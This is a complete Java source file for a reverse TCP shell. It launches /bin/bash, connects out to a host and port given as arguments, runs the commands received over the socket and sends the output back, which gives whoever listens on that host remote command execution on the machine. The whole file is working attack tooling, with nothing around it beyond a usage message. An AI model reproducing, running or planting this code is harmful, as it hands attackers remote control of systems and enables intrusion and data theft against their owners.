import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;

public class ReverseTcpShell {

	public static void main(String[] args) {
		ProcessBuilder pb = new ProcessBuilder("/bin/bash");
		pb.redirectErrorStream(true);
		try {
			Process proc = pb.start();
			
			InputStream proc_stdout = proc.getInputStream();	// and stderr
			OutputStream proc_stdin = proc.getOutputStream();
			
			try {
				InetAddress.getByName(args[0]);	// ip
				Integer.parseInt(args[1]);	// port
			} catch (UnknownHostException e) {
				System.err.println("Invalid IP address.");
				printUsage();
				System.exit(1);
			} catch (NumberFormatException e) {
				System.err.println("Invalid port.");
				printUsage();
				System.exit(1);
			} catch (Exception e) {
				printUsage();
				System.exit(1);
			}
			
			InetSocketAddress addr = new InetSocketAddress(args[0], Integer.parseInt(args[1]));
			SocketChannel channel = null;
			try {
				channel = SocketChannel.open(addr);
				channel.configureBlocking(true);

				OutputStream sock_os = channel.socket().getOutputStream();
				if (channel.isConnected()) {
					sock_os.write("Hello!\nEnter some shell commands...\n\n".getBytes());
				}
				
				while (channel.isConnected()) {
					ByteBuffer command_line = ByteBuffer.allocate(1024); // 1024 byte capacity
					
					// read command from socket into buffer
					channel.read(command_line);
					String cmd_str = new String(command_line.array(), java.nio.charset.Charset.forName("UTF-8")).trim();	 // convert to String
					
					// if the user enters "exit" or presses Ctrl+c, we're done
					if (cmd_str.equals("exit") || command_line.array()[0] == 0x00) {
						break;	// done
					}
					
					// write to stdin of /bin/bash
					proc_stdin.write(command_line.array());
					proc_stdin.flush();
					
					// wait for command to be processed
					try {
						Thread.sleep(100);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					
					// write /bin/bash stdout back to socket
					while (proc_stdout.available() > 0) {
						sock_os.write(proc_stdout.read());
					}
					
					sock_os.write("\n".getBytes());				
					sock_os.flush();	
				}
				
			} catch (IOException e) {
				e.printStackTrace();
			} finally {
				if (channel != null)
					channel.close();
				proc.destroy();
			}
			
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	public static void printUsage() {
		System.out.println("Usage: ReverseTcpShell.java <ip> <port>");
	}
}
